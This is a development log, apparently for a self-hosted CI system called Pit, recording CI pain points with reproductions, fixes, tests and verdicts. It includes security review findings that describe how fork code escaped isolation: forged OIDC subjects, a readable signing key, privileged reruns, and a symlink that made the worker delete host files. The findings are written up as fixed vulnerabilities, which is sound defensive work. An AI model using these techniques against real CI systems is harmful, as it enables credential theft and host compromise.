**Fix** (research/pain-hunt), built on lanes:
1. **A passing candidate settles the ones before it.** Every candidate contains all earlier
   changes in its lane, so they are marked passed together, their runs are skipped ("covered
   by run_…"), and they land.
2. **A waiting candidate gets folded in.** A change that joins a lane while the previous
   candidate's run has not been picked up by any worker replaces that run ("batched into
   run_…"). Only the newest candidate is tested.
3. **A failed batch is split.** If a candidate fails while earlier entries in its lane were
   batched into it, those entries get their own runs, and the existing ejection logic finds the
   change that broke it.

Runs dropped this way end as **skipped** ("cancelled" on GitHub), not failed. The new
`Db::skip_run_because` exists so a batched run never shows up as a red run.

```
10 overlapping PRs, 5s checks, 2 slots:
  before (P35):  10 landed in 29.9s, 10 runs
  after:         10 landed in 12.9s,  3 runs passed, 7 skipped (batched or covered)
6 PRs with a bad one in the middle (bis3 adds a file the check rejects):
  bis0–2, bis4–5 landed; bis3 failed; its file never reached main.  43.0s (the failure costs the split)
```

Covered by the e2e test `merge_queue_batches_waiting_changes_and_bisects_failures`. It occupies
all four worker slots so queued candidates must wait, then queues `a`, `b` (bad) and `c`. It
expects `a` and `c` landed, `b` ejected, at least one "batched into" run, and `b`'s file absent
from `main`. It passed on three repeated runs, and all earlier merge queue tests still pass.

**Hardened after an independent review** of the batching commit, which found:
1. **(High) A batched change could be stranded forever.** If the change it was batched into
   left the queue (removed, unlabelled, branch updated or deleted, requeued), nothing ever gave
   the batched change a run back, and a lane could deadlock. Now each lane's newest testing entry
   always gets a run if it has none. That one run covers every earlier batched entry. A new e2e
   test (`a_change_batched_into_a_removed_one_still_lands`) failed with this fix disabled and
   passes with it.
2. **(Medium) Promotion and landing.** A later candidate passing promoted earlier entries even
   if one had a run that already failed. Each entry's own commit was also pushed in turn, so the
   target passed through commits nobody had tested on their own. Now an entry whose own run
   failed is never promoted. A batch lands atomically: one push of the newest passed candidate,
   all its entries marked landed at that commit, and one post-merge run. Live: 10 overlapping
   PRs landed in 18.6s with 3 queue runs and **2 post-merge runs** (it was 10).
3. **(Low) A crash at the wrong moment could eject a change.** Entry state is now saved before
   its run is skipped.

An existing test assumed `a2` always joins `a1`'s lane. With faster landing, `a1` can land first
and `a2` then starts on top of it, so the test now checks that `a2` was tested on top of `a1`
either way.

**Verdict: SOLVED** for CI cost per landed change in a busy queue. Not done:
- **Linear split.** A failed batch is split by testing each folded change, not by binary
  bisection, so a batch of N costs up to N runs on failure.
- **Only waiting runs are batched.** A run a worker has already started is never cancelled to
  batch, so on an idle fleet each change still gets its own run. There it costs nothing extra,
  since the slots were free.

## P37. Docker Hub rate limits, and container tags that move

**Pain.** Docker Hub caps unauthenticated pulls at **10 per hour per IPv4 address or IPv6 /64**
(100 per hour for free authenticated users) since April 2025. CI jobs on shared or ephemeral
runners pull their images every time, so a modest suite hits `toomanyrequests` (HTTP 429)
within minutes. The fixes are logging in on every job, mirrors, or moving images to another
registry ([Docker docs change](https://github.com/docker/docs/pull/22081/files),
[Blacksmith](https://www.blacksmith.sh/blog/you-have-5-days-before-the-new-dockerhub-limits-f-ck-you-over),
[Docker forums](https://forums.docker.com/t/toomanyrequests-you-have-reached-your-unauthenticated-pull-rate-limit/147241),
[daily.dev](https://daily.dev/posts/new-docker-hub-pull-rate-limits-what-you-have-to-do--8xrvbqcio),
[OneUptime](https://oneuptime.com/blog/post/2026-02-08-how-to-fix-docker-too-many-requests-rate-limit-errors/view),
[devopslesson](https://devopslesson.com/troubleshooting/toomanyrequests-docker-hub-rate-limit)).

**Reproduction** (`/tmp/painhunt/p37`): a `docker` task with an image this machine did not have
(`busybox:1.36`), run 5 times on 5 commits while counting `docker events` pulls. Docker Hub's
`ratelimit-remaining` header was read before and after a run with an image already present.

```
5 runs, image not present at first:  1 pull (first run 5.5s; then 1.4–2.4s)
5 runs, image present:               0 pulls; Docker Hub ratelimit-remaining 100 → 100
```

Pit runs `docker run` without `--pull`, so a worker uses its local image and never contacts the
registry again. Rate limits: **SOLVED** by having long-lived workers, with nothing to configure.

**Gap found (the flip side):** a worker keeps the image a tag pointed to when it first pulled
it, and the cache key held only the image *name*. Simulated by re-tagging `pit-demo:stable` from
busybox to alpine:

```
before (research/pain-hunt at P36):   tag moved → ◆ test cached     (result from the old image)
```

**Fix** (research/pain-hunt): the worker measures the local image ID of every `docker` task, and
of every fork run, which is forced into Docker. It pulls first if the image is missing. The ID
goes into the action key as an implicit runtime input (P17), and the server never answers
container tasks from cache, since only the worker knows what a tag means there.

```
after:  tag on busybox → ✓ ran because `docker image pit-demo:stable` is now part of the key (sha256:73aaf0…)
        same again     → ◆ cached
        tag moved      → ✓ ran because `docker image pit-demo:stable` changed (sha256:73aaf0… → sha256:d9e853…)   prints "alpine"
```

Unit test `a_moved_image_tag_changes_the_key`.

**Verdict: SOLVED** for rate limits and for stale results. Not done:
- **No refresh.** Workers do not pull a moved tag by themselves; run `docker pull` or pin a
  digest. Different workers can run different images for one tag, and the key now keeps their
  results apart, but tests can still behave differently per worker.
- **One-time cache miss.** Existing cached results of `docker` tasks miss once after upgrading,
  because the key now includes the image.

## P38. Long-lived cloud keys stored as CI secrets

**Pain.** CI that deploys needs cloud credentials. Stored access keys (`AKIA…` in CI secrets)
never expire and leak (P13, P31, tj-actions). GitHub Actions replaced them with OIDC: each job
gets a short-lived token signed by GitHub, and AWS, GCP and Azure trade it for temporary
credentials after checking `aud` and `sub` (`repo:org/repo:ref:refs/heads/main`) against a trust
policy. Policies that skip `sub`, or wildcard it, let other repositories assume the role
([OneUptime](https://oneuptime.com/blog/post/2026-02-02-github-actions-oidc-aws/view),
[aloknecessary](https://aloknecessary.in/blogs/github-actions-oidc/),
[haitmg](https://haitmg.pl/blog/github-actions-oidc-aws-backdoor/),
[cloudupload](https://cloudupload.tech/blog/hardening-github-actions-oidc),
[classmethod](https://dev.classmethod.jp/en/articles/aws-sts-oidc-github-google-circleci-oci/),
[Skyscanner sample](https://github.com/Skyscanner/gha-aws-oidc-sample)). A self-hosted CI
without an issuer is back to stored keys.

**Before** (research/pain-hunt at P37): Pit had no token issuer. The only way to the cloud
was a stored key in `--secrets-file` (P31). **NOT SOLVED.**

**Fix** (research/pain-hunt): the server is an OIDC issuer.
- **Key and discovery.** An ES256 (P-256) key is generated on first start with `ring` and kept
  in the data dir with mode 0600. It is published at `/.well-known/openid-configuration` and
  `/.well-known/jwks.json`, which bypass API auth because clouds fetch them.
- **Token endpoint.** `POST /api/oidc/token` signs a 10-minute token only for the holder of a
  live job lease, with claims taken from the run as the server recorded it: `sub` in GitHub's
  shape for trusted branch runs and distinct shapes for queue, PR and local runs, plus
  `trusted`, `trigger`, `repo`, `ref`, `sha` and `run_id`.
- **Forks.** Fork pull requests (P31) get 403.
- **Tasks.** A task opts in with `oidc: "<audience>"` and gets `PIT_OIDC_TOKEN`, masked in logs.

**Live** (`/tmp/painhunt/p38`):

```
GET /.well-known/jwks.json → {"keys":[{"alg":"ES256","crv":"P-256","kid":"e117ab36561b9515","kty":"EC",…}]}
key file: -rw------- oidc-es256.p8
deploy │ raw: ***                                   (the token itself is masked)
deploy │ {"aud":"sts.amazonaws.com","exp":…,"iss":"http://127.0.0.1:7070","ref":"main","repo":"app-bb135f",
          "sub":"repo:app-bb135f:local:main","trigger":"local","trusted":false,…}
```

Covered by unit tests (`signs_tokens_that_verify_against_the_published_key`, where another
audience is rejected and the key survives a restart, and `subjects_keep_main_apart_from_everything_else`)
and the e2e test `tasks_get_verifiable_oidc_tokens`. That test verifies the token the way a cloud
does: discovery, then JWKS, then an ES256 signature check with audience and issuer, then the
claims. It also checks the token is masked in the log and that there is a 403 without a lease.

**An independent security review of that first version found it unsafe.** Three findings were
reproduced against the built binary:
1. **(Critical) Forged subjects.** Any API token holder could create a run with
   `trigger: "ref", ref: "refs/heads/main"` and get `sub: repo:X:ref:refs/heads/main`, because
   untrusted subjects were built as `repo:{repo}:{trigger}:{ref}`.
2. **(Critical) Squatted repo names.** Registering an unclaimed repo name through the API gave a
   trusted schedule or merge queue run of the caller's own code, with a main-branch `sub`.
3. **(Critical) A readable key.** Under `pit up` the worker shares the server's user, so any
   task, including a fork run, could read `oidc-es256.p8` and sign tokens offline.

Three more came from reading the code:

4. **(High) Claiming a main job without code.** Without `PIT_WORKER_TOKEN`, any API token
   holder could claim a main job and mint a token from its lease.
5. **(Medium) Queue subjects** ignored trust and the target branch.
6. **(Low) Key file race.** The key file was briefly world-readable, and any read error
   regenerated it.

**Fixed:**
- **Opt-in.** OIDC is off unless `pit server --oidc`, which refuses to start without both
  `PIT_TOKEN` and `PIT_WORKER_TOKEN`. `pit up` cannot enable it, and no key is created otherwise.
- **Trusted, GitHub-verified runs only.** Tokens go only to trusted runs of repos registered by
  a signed GitHub webhook, and the subject uses GitHub's `owner/name`.
- **Two subject shapes.** `subject()` produces only `…:ref:refs/heads/<branch>` (push,
  post-merge, schedules) and `…:merge_queue`, and rejects names containing `:`, `*` or spaces.
- **Safe key file.** It is created `create_new` with mode 0600, and only a missing file is
  regenerated.

The e2e test (`oidc_tokens_only_for_trusted_github_runs`) now covers the review's cases:
- **Refused setups:** OIDC is off by default, and `enable_oidc` fails without a worker token.
- **The good path:** a signed push to main gets a verifiable token with
  `sub: repo:acme/widgets:ref:refs/heads/main` and `trusted: true`, masked in the log.
- **Refused runs:** a `pit run` of the same repo is refused, and so is the review's forged API
  run (`trigger: "ref"`).

Live, `pit up` now serves no JWKS (404), and a task asking for a token is refused with a clear
message.

**Verdict: PARTIAL.** Issuance is complete and standards-shaped, but it was **not tested against
a real cloud provider** from this machine. It is also only safe with the `--oidc` server on a
host where no task runs: a same-user task can read the key file or the worker's environment. A cloud also needs the issuer at a public HTTPS URL
(`PIT_PUBLIC_URL` behind TLS). Not done:
- **No token refresh.** Tasks longer than 10 minutes that need fresh credentials get no new
  token.
- **One audience per task.**
- **Short-lived only from issuance.** Anyone with the API token can create a `pit run` and get a
  `local` token; that is why its `sub` is distinct, so no main-branch policy matches it.

## P39. Every push to a pull request runs CI twice

**Pain.** With both `on: push` and `on: pull_request`, a push to a branch with an open PR fires
both events for the same commit. Identical runs execute in parallel, double the minutes, and
clutter the checks list. The fixes each cost something:
- **Restricting `push` to `main`** loses CI on branches without a PR.
- **`concurrency` with `head_ref || ref`** cancels one run, and a cancelled run does not satisfy
  a required check, which can leave the PR unmergeable.
- **`skip-duplicate-actions`** is another dependency.

Sources: [community#26940](https://github.com/orgs/community/discussions/26940),
[open-telemetry-python#1370](https://github.com/open-telemetry/opentelemetry-python/issues/1370),
[oboete#221](https://github.com/ojungo69/oboete/issues/221),
[personal_website#18](https://github.com/studiobaeric/personal_website/issues/18),
[jupytext#1041](https://github.com/mwouts/jupytext/pull/1041),
[coder/boundary#9](https://github.com/coder/boundary/pull/9),
[DEV](https://dev.to/ace2932/cancel-duplicate-github-actions-runs-with-one-block-and-the-one-place-you-shouldnt-2m3k),
[wildwolf](https://wildwolf.name/github-actions-how-to-avoid-running-the-same-workflow-multiple-times/),
[Latenode](https://community.latenode.com/t/prevent-github-actions-from-running-twice-when-pushing-to-branch-with-open-pull-request/25028).

**Reproduction** (`/tmp/painhunt/p39`): a second Pit server (`pit up --addr 127.0.0.1:7171`)
with a GitHub webhook secret. Signed `push` (branch `feature`) and `pull_request` (`synchronize`,
PR #7) webhooks are sent back to back for the same commit, which is what GitHub does. The commit
has `build` (4s) then `test` (3s), and each execution appends a line to `work.log`.

```
push:          run_dc4b0397b3de     build passed, test passed   (ran)
pull_request:  run_9a1b62c38fe1     build cached "waited 4.4s for the same task …", test cached "waited 3.1s"
both finished after 8.7s;  work.log: 1 build, 1 test
```

Both events still create a run and both report green, so required checks are satisfied and
nothing is cancelled. But the work happens once. The second run waits for the first's identical
tasks (P30) and is answered from the cache, so the pair costs one run's compute and wall time,
with no change to the CI config.

**Verdict: SOLVED** for the cost. The leftover is cosmetic: two runs appear in Pit's run list,
and the waiting run holds a worker slot while it waits (P30's open point).

## P40. Shards split by file count, so one shard gets all the slow tests

**Pain.** Jest, Vitest and Playwright split shards by count, not duration. One shard collects the
slow files and sets the wall time while the rest idle. In workadventure's e2e suite one shard ran
1249s against 362s for its sibling, out of a 26-minute pipeline. Teams write duration files and
greedy longest-first packers, or tune `PWTEST_SHARD_WEIGHTS`. Vitest and Playwright have open
requests for timing-based sharding
([workadventure#6543](https://github.com/workadventure/workadventure/pull/6543),
[zvid#743](https://github.com/lsegal/zvid/pull/743),
[playwright#17969](https://github.com/microsoft/playwright/issues/17969),
[vitest#9184](https://github.com/vitest-dev/vitest/issues/9184),
[murlan#441](https://github.com/metasito/murlan/issues/441),
[purosur#1190](https://github.com/ljguardiola/purosur.online/issues/1190),
[Currents](https://currents.dev/posts/optimizing-test-runtime-playwright-sharding-vs-workers),
[traceloom](https://traceloom.io/blog/playwright-test-sharding/)).

**Before** (research/pain-hunt at P39): `shards: N` only set `PIT_SHARD`/`PIT_SHARD_COUNT`, and
splitting was the runner's job, by count (P14's open point).

**Fix** (research/pain-hunt): `shardFiles` globs on a sharded task.
- **Planning.** The server matches them against the commit's files and deals them longest
  first, each to the least-loaded shard. Durations are recorded per repo and task; files with
  no recorded time count as the average. The split is made once, so every shard agrees, and it
  is part of each shard's cache key.
- **Running.** Each shard gets its files in `PIT_SHARD_FILES`. A shard dealt nothing passes
  without running its command, because `runner $PIT_SHARD_FILES` with an empty list would run
  every test.
- **Learning.** Durations come from JUnit `reports` (P34) when suites or cases name files.
  Otherwise the worker reports the shard's total, and the server splits it in proportion to what
  it knows of each file. An earlier even split oscillated: a run regressed from 4.8s back to
  7.0s.

**Reproduction** (`/tmp/painhunt/p40`): 9 files, 3 of them 3s (`a1`, `b1`, `c1`) and 6 of them
0.3s, 3 shards on the 2-slot worker. The tests run serially inside a shard
(`--test-concurrency=1`), like Playwright with one worker or most browser e2e suites.

```
node --test-shard (count):     slowest shard 9.7s, 9.8s     (a1, b1, c1 all in shard 1)
shardFiles (duration):         run 1 9.6s (no data yet) → run 2 4.9s → 5.3s → 4.3s → 4.3s → 4.9s
ideal: ≈ 3.6s of tests per shard + ≈ 0.9s startup ≈ 4.5s
```

**Honest negative:** with Node's default (files run in parallel inside a shard) the count split
already cost little, because three 3-second files in one shard took 3.7s. The duration split
evened the shards (3.4–3.7s each) without lowering the slowest. The gain is for serial suites.

Covered by the unit test `deals_longest_first_to_the_least_loaded_shard` and the e2e test
`shard_files_are_dealt_once_each` (every file exactly once; empty shards skipped).

**Verdict: SOLVED** for serial or worker-limited suites: the slowest shard went from 9.7s to
about 4.5s after one learning run. Not done:
- **Shard count.** Pit does not choose the number of shards.
- **Granularity.** Splitting is per file, so one huge file is still indivisible.
- **One cold run.** The first run of a new task has no data and splits as evenly as it can.

## P41. Autoscaling self-hosted runners: no signal to scale on, and scale-downs kill jobs

**Pain.** Self-hosted fleets either idle (cost) or queue at peak, so teams run Actions Runner
Controller or custom scalers. Those need tuning (`minRunners`, `maxRunners`) and on-call care,
and the recommended signal is queue time
([tenki](https://tenki.cloud/blog/self-hosted-runners-arc-security-guide),
[devopskit](https://devopskit.in/blog/github-actions-runner-cost-optimization/),
[resumelens](https://www.resumelens.org/blog/github/github-self-hosted-runners),
[instadevops](https://instadevops.com/blog/github-actions-self-hosted-runners-guide/),
[pavanrangani](https://pavanrangani.com/blog/github-actions-self-hosted-runners-kubernetes),
[openmetal](https://openmetal.io/resources/blog/the-real-cost-math-behind-self-hosted-github-actions-runners/),
[starsling](https://starsling.dev/self-hosted-github-runners)). Scaling down has its own trap: a
runner stopped mid-job loses the job.

**Before** (research/pain-hunt at P40):
- **No signal.** Pit had no queue-depth or wait-time signal; `/api/stats` only had totals.
- **Lost jobs on scale-down.** Stopping a worker killed it outright (`/tmp/painhunt/p41`, a
  separate server and worker on port 7272). With SIGTERM 2.5s into a 6-second job, the worker
  died at once, and the replacement only got the job after the 60s heartbeat timeout:

```
run finished 70s after the replacement worker started — passed in 73.2s (a 6s job)
```

**Fix** (research/pain-hunt):
- **`GET /metrics`** (Prometheus text) with `pit_queued_groups{os}`,
  `pit_oldest_queued_seconds{os}`, `pit_running_groups`, `pit_workers_online`,
  `pit_workers_busy`, and counters for cache hits, tasks run and time saved.
- **Graceful worker shutdown.** The first SIGTERM (or Ctrl-C) stops claims, finishes the running
  groups and exits. The second hands the groups back with a new `POST /api/groups/{id}/release`,
  so the server requeues them now and revokes their leases. Then it stops their tasks' process
  groups and exits.

```
6 runs of 4s on the 2-slot worker:  pit_queued_groups{os="any"} 4, pit_oldest_queued_seconds 1.85 → 2 / 6.87 → (empty)
one SIGTERM mid-job:                 job finished (passed in 6.5s); worker exited 4.1s later, when it was done
two SIGTERMs mid-job, w3 waiting:    "group … released by its worker; requeued"; orphan task processes: 0;
                                     w3 ran it → passed in 11.7s (was 73.2s)
```

Getting the hard stop right took two fixes found while testing it:
- **A lost second signal.** A second listener created after the first signal missed a quick
  second SIGTERM. Now one listener is read twice.
- **Wrong order.** Cancelling the tasks before releasing let the process exit, after its job
  ended, before the release was sent. Now release comes first.

Covered by the e2e test `metrics_show_queue_depth_for_autoscaling` and the unit test
`a_released_group_is_queued_again_at_once`. The signal handling was verified live as above; it
has no automated test.

**Verdict: PARTIAL.** Pit now provides the signal and safe scale-downs, but it does not scale
anything itself; a KEDA, HPA or script still has to start and stop workers. `pit_workers_busy`
counts workers, not slots, because the server does not know how many slots a worker has.

## Review of P31–P40

An independent reviewer read P31 to P40 (except the batching and OIDC code, which had been
reviewed already). The most serious result: **P31's fork protection had three holes**, so
"docker only, no secrets" was not true when P31 was written. Fork code could get out of the
container three ways. All 18 findings are fixed except one part of #15 (old timing rows are never pruned) (`cargo test`: 61 unit,
31 e2e, clippy clean).

Fork code escaping the container (high):

1. **GitHub's "Re-run" ran a fork's commit with full privileges.** The rerun webhook created a
   plain run: host backend, worker `env` and `secrets`, warm workspace. A rerun now copies the
   restrictions of the commit's earlier runs (a fork's if any was one). Pit ignores a commit it
   never ran. The e2e test reruns the fork's check and asserts the new run has no secrets and
   still passes `test -z "$SECRET"`.
2. **A fork's `runtime` commands ran on the worker host** with the worker's whole environment
   (`PIT_TOKEN`, `PIT_WORKER_TOKEN`), before any fork check. Now:
   - Runtime commands follow the task's environment rules everywhere. That also fixes trusted
     runs, which skipped the `PIT_*` stripping.
   - A fork's runtime commands run in its task container, with no network.
3. **A fork's `pit.config.ts` was evaluated by Node on the server.** Clearing the environment
   did not stop it reading the server's files: the database, and the OIDC signing key, which
   would let it mint default-branch cloud tokens. A fork's config is now evaluated in
   `node:22-alpine`:
   - no network, a read-only root, all capabilities dropped, user `nobody`;
   - nothing mounted but the config and its context file.

   A unit test plants a key file and a `PIT_TOKEN` on the host. The sandboxed config reads
   `blocked blocked none`: no file, no network, no token. Without Docker, the run fails with a
   message pointing to `pit.config.json`.
4. **Symlinks committed in the fork redirected the worker's file handling** (medium-high). A fork
   committing `r -> /home/pit` with `reports: ["r/.local/share/pit/**"]` made the worker delete
   that directory on the host before the task ran, and outputs could upload host files. The fix
   is in `safe_join`, used for clearing, collecting, restoring and writing, and a unit test
   covers it:
   - A path whose existing parent directories include a symlink is now refused.
   - A symlink as the last component is only skipped or replaced, never followed.

Fork isolation (medium and low):

5. **The merge queue retested whatever a fork pushed after it was queued**, as a trusted run with
   secrets (#18). The label had also been applied to the PR head as fetched later, not the commit
   it was added on. Fork entries are now pinned:
   - queued at the labeled SHA (refused if the PR has already moved);
   - removed with "new commits were pushed after it was queued; add the merge label again" when
     its head moves.

   The e2e test pushes to the fork during a 20s candidate run and sees the entry removed.
6. **Fork results went into the shared untrusted cache**, which same-repo PRs (with secrets) read.
   Forks now read the cache but write nothing. They take no single-flight claim, so nobody waits
   for them, and record no shard timings.
7. **Fork groups could land on workers without Docker**, then fail every task. Docker is now a
   required backend for them at planning, so they wait for a worker that has it. The e2e test
   checks that wait on machines without Docker.
8. The minimal fork environment dropped `DOCKER_HOST`, `DOCKER_CONTEXT`, `DOCKER_CONFIG` and
   `XDG_RUNTIME_DIR`, breaking rootless and remote Docker. Only the docker client sees them; they
   are kept now.
9. An image name starting with `-` is rejected at config load (it reached `docker run` as an
   argument; not exploitable as written).

Silent green and wrong coverage (medium):

10. **Shard splits and timings were keyed by bare task name.** With groups `unit` and `e2e` each
    having a sharded `test`, the second group's shards got the first group's split: its own files
    never ran, and the run was green. Both are now keyed by group and task (`unit.test`). The
    server also takes the key from the lease's own group, not from the worker's request. The e2e
    test runs two such groups and checks each one's files.
11. **`shardFiles` could pass without running anything.** Now:
    - it needs `shards` of 2 or more;
    - globs that match no files fail the run ("match no files");
    - if the file index fails, planning fails instead of silently skipping the split.
12. **Quarantine hid everything after the quarantined task.** A quarantined `build` failing made
    its dependent `test` skip, and skips did not count, so the run was green with no tests run. A
    dependency-skipped task now fails the group unless it is quarantined itself. The e2e test
    checks this.
13. **JUnit parsing could be made to hang or underflow.**
    - Duplicate detection was a linear scan per failure, so a fork's report with a million
      failures cost hours of CPU after the task timeout had passed.
    - A test case with two `<skipped/>` elements underflowed the "passed" count.
    - Now: a hash set for duplicates, 100 failures kept with messages and the rest counted, report
      files over 64 MiB skipped, and saturating counts. 200,000 failures parse in under a second
      in the unit test.

Smaller fixes:

14. `PIT_SHARD_FILES` was space-joined, so names with spaces split and a large list could exceed
    the environment limit (E2BIG). It is now one file per line. The full list is always in
    `PIT_SHARD_FILES_LIST` (`.pit/shard-files`), and lists over 64 KiB are left out of the
    environment.
15. `read_blobs` had three bugs, now fixed with a unit test:
    - A path containing a newline shifted every later answer onto the wrong path; such paths are
      now skipped.
    - A git failure read as "no packages"; it is now an error.
    - Truncated output could panic.
16. `pit flaky` ran a weeks-long scan holding the DB lock on an async thread. It now runs on a
    blocking thread with a `tasks(finished_at)` index. Its "runs" column counted executions; it
    is now labeled "finished".
17. The `--secrets-file` help now says what the README already said: host and sandbox tasks run
    as the worker's user and can read the file itself.

Not fixed: timings rows are never pruned for files that no longer exist; that growth is slow and
bounded by the repo's history. The OIDC/queue code outside this review's scope is unchanged
beyond #18.

P31's verdict stays **PARTIAL**, now for the right reasons. A fork's code, config included, runs
only in containers with no secrets. *(Correction from the next review: the worker could still write
through a symlink a container planted in `.git`, and the symlink checks could be raced. Both are
fixed in "Review of P41–P45".)* What remains: P31's existing limits, and the config sandbox
needs Docker on the server.

## P42. Git LFS: every CI checkout downloads every large file again

**The pain.** On GitHub, every LFS download counts against the repository owner's LFS bandwidth,
CI checkouts included. GitHub staff confirmed `actions/checkout` downloads count
([community #26775](https://github.com/orgs/community/discussions/26775)). Because a fresh runner
downloads every object on every run, frequent builds use up the quota. When it runs out, downloads
fail with "This repository exceeded its LFS budget"
([community #151710](https://github.com/orgs/community/discussions/151710)).
[actions/checkout#165](https://github.com/actions/checkout/issues/165), "Cache for LFS", has been
open since 2020. The workarounds:
- a hand-built `actions/cache` of `.git/lfs` keyed on `git lfs ls-files`
  ([mikepenz](https://blog.mikepenz.dev/a/caching-in-ga/));
- drop-in actions such as
  [action-cached-lfs-checkout](https://github.com/nschloe/action-cached-lfs-checkout);
- skipping LFS entirely with `GIT_LFS_SKIP_SMUDGE=1`.

**Reproduction.**
- A repo with a 5 MB random `model.bin` tracked by LFS, and a task that checks its sha256 against
  `expected.txt`.
- To count bandwidth, a small Git LFS server (batch API, basic transfer, about 70 lines of Python)
  served the objects and counted downloads. The repo points at it through `.lfsconfig`.
- git-lfs 3.4.1 installed the Ubuntu way, which sets the LFS filter in the system git config.

Before:
- **A repo without `.lfsconfig` (most repos: the LFS URL comes from the remote) did not run at
  all.** The workspace is a `--shared` clone of the worker's mirror, so its LFS remote is the
  mirror, which never had the objects. Checkout failed: `smudge filter lfs failed … remote
  missing object`. Every task was skipped and the group errored.
- With `.lfsconfig`, it ran:
  - each warm workspace downloaded its own copy: one 5 MB download for three runs in the same
    workspace;
  - another 5 MB for `--fresh`;
  - the same again for every other workspace (each slot, the trusted and untrusted pools).
- For comparison, three fresh clones (what an ephemeral runner does) downloaded 15 MB.

**Fix.**
- When a commit's `.gitattributes` use `filter=lfs` and `git-lfs` is installed, the worker runs
  `git lfs fetch origin <sha>` in its mirror, under the mirror lock. That downloads only the
  objects the mirror lacks.
- Each workspace gets the LFS filter (`git lfs install --local --skip-repo`) and
  `lfs.storage = <mirror>/lfs`, so checkout smudges from the mirror's copy without downloading
  anything.
- Without `git-lfs`, or with `GIT_LFS_SKIP_SMUDGE=1`, files stay pointers and the group's result
  says so, instead of a task failing later on a 130-byte "model".
- Cache keys are unchanged: they hash the pointer blob, which names the content's sha256.
- `pit run` overlays were already right: `git diff` applies the clean filter, so only LFS files
  actually edited travel, with their content.

After, measured against the counting server, with the mirror's and workspaces' LFS stores
deleted first:

| | downloads | bytes |
| --- | --- | --- |
| 3 fresh clones (ephemeral runners) | 3 | 15 MB |
| Pit before: 3 runs + 1 `--fresh` | 2 | 10 MB, plus 5 MB per extra workspace |
| Pit after: 3 runs + 2 `--fresh` | **1** | **5 MB** |

- The no-`.lfsconfig` repo now passes, and the task saw the real content (its sha256 matched).
- The e2e test `git_lfs_files_are_fetched_once_per_worker` pushes an LFS file to a bare origin
  and runs a normal workspace and a fresh one. Both see the content; the worker holds exactly
  one copy, in its mirror, and no workspace holds its own.

**Verdict: SOLVED** for one worker: each LFS object is downloaded once per worker, not once per
checkout. Limits:
- Each worker still downloads once; the server does not share LFS objects through its CAS.
- A fork's new LFS objects are fetched from the base repo's LFS endpoint. Whether that endpoint
  has them depends on the host; not tested.
- The pointer-file note for workers without git-lfs was not exercised here, because this machine
  has git-lfs.

## P43. Debugging a CI failure means guessing from the log, or pushing an SSH step

**The pain.** When a job fails in CI but not locally, the log is all GitHub Actions gives you. To
look around (what got built, which tool versions the image has, what a file contains) you add
[action-tmate](https://github.com/mxschmitt/action-tmate) to the workflow, push, wait for the run,
and SSH in before the session times out. The common recipes:
- gate the step on `if: failure()` with a timeout
  ([nshephard](https://blog.nshephard.dev/posts/tmate/));
- add a `workflow_dispatch` input so the debug step only runs on demand
  ([ridingthecrest](https://www.ridingthecrest.com/blog/2024/12/04/tmate-github-actions-debug.html),
  [Daniela Baron](https://danielabaron.me/blog/debug-github-action/));
- forks exist for self-hosted runners behind a VPN
  ([canonical/action-tmate](https://github.com/canonical/action-tmate));
- RunsOn's [debug guide](https://runs-on.com/github-actions/debug/) describes the same loop.

Each look costs a commit and a full run, and the shell is on a runner that disappears.

**Reproduction.** A two-task `docker` group in `node:22-alpine`:
- `build` writes `dist/app.js`;
- `test` expects `dist/bundle.js` and fails with "dist/bundle.js missing".

Before, Pit gave the same as Actions: the log line. The failed workspace was reused by the next
run, so the only way to see what `dist/` held was to edit the task (add an `ls`) and run again. Pit
had no command for getting into a failed task's environment.

**Fix: `pit run --debug`** (and `debug: true` on the MCP `run` tool).

When a task fails:
- The worker writes a script, outside the workspace and readable by its user only. The failed
  task's result names it: `debug: sh …/debug/<group>/test.sh opens a shell where it ran, or runs
  a command there`.
- The script `cd`s into the failed workspace, exports the task's variables, and runs the same
  backend command line the task ran (`docker run … node:22-alpine`, same mount, user and network
  setting; or `unshare` for sandbox, or `sh` for host), with an interactive shell in place of the
  task's command.
- Arguments replace the shell: `sh test.sh 'ls dist'`. That form works for coding agents, which
  cannot drive a TTY.
- Values of the task's `secrets` are left out; the script names them. Values the task takes from
  the worker's environment through `env` are written in, so the script and its directory are
  readable by the worker's user only (mode 0700 from creation).
- The workspace stays busy (no job checks out over it) for 30 minutes, or until the script is
  deleted.

**Measured:**
- `sh test.sh 'ls dist; cat /etc/alpine-release; echo task=$PIT_TASK'` printed `app.js`, `3.24.2`
  and `task=test` in 1.95s: inside the task's own container, in the workspace it failed in, with
  no commit or rerun.
- The interactive form gave a shell with a TTY (`/workspace #`, `tty=/dev/pts/0`).
- A run started during the hold got workspace `1`, leaving the failed `0` untouched.
- Deleting the script released the workspace within the 2s poll.
- Tests:
  - e2e `debug_runs_keep_the_failed_workspace_and_a_way_in`: a task leaves a file and fails. The
    script reads that file and `$PIT_TASK`. A second run does not touch the held workspace, and
    deleting the script releases it.
  - Unit tests check that the script runs commands with the right variables and quoting, leaves
    out secret values, and that the hold ends when the scripts go.

**Verdict: PARTIAL.** Debugging needs no extra commit or run, and the shell is the task's real
environment. Limits:
- The script is on the worker, so with a remote worker you still need a login on that machine.
  Pit does not relay a shell the way tmate does.
- Unix workers only.
- The shell inherits your environment where the task got the worker's: only the task's own
  variables are reproduced, plus, for fork-style runs, a note that the task saw a minimal
  environment.

## P44. CI gets slower and nobody notices

**The pain.** CI services report failures, not slowdowns. "GitHub never pings you when CI
quietly takes twice as long"
([DEV](https://dev.to/ace2932/why-your-github-actions-ci-is-slow-and-how-to-speed-it-up-19la)).
Creep is gradual, and Actions shows one run at a time, so "no one is asking whether things are
getting better or worse"
([DEV, citrend](https://dev.to/_06a3df6b50aec966668fb/github-actions-wont-tell-you-your-ci-is-getting-worse-i-built-a-zero-dep-cli-that-does-260o)).
The answers people build:
- third-party CLIs and dashboards
  ([avrea](https://avrea.com/blog/github-actions-observability),
  [kleore](https://www.kleore.com/blog/github-actions-ci-optimization));
- a cron workflow that pulls run data from the API
  ([OneUptime](https://oneuptime.com/blog/post/2026-02-02-github-actions-performance-optimization/view));
- percentile charts of queue time against run time
  ([WarpBuild](https://www.warpbuild.com/answers/why-are-github-actions-slow));
- hand-written JUnit duration budgets
  ([monorepo case study](https://dev.to/jimmyyeung/journey-of-systematically-cut-our-monorepo-ci-time-in-half-ec8)).

One [community thread](https://github.com/orgs/community/discussions/162536) traced a sudden slowdown
to the runner's drive layout.

**Reproduction.**
- `p44`: `test` gets half a second slower every run (1.0s, 1.5s, … 4.5s) while `build` stays at 1s.
  After 8 runs, `test` took 4.5x its first duration. Nothing said so: every run printed `passed`,
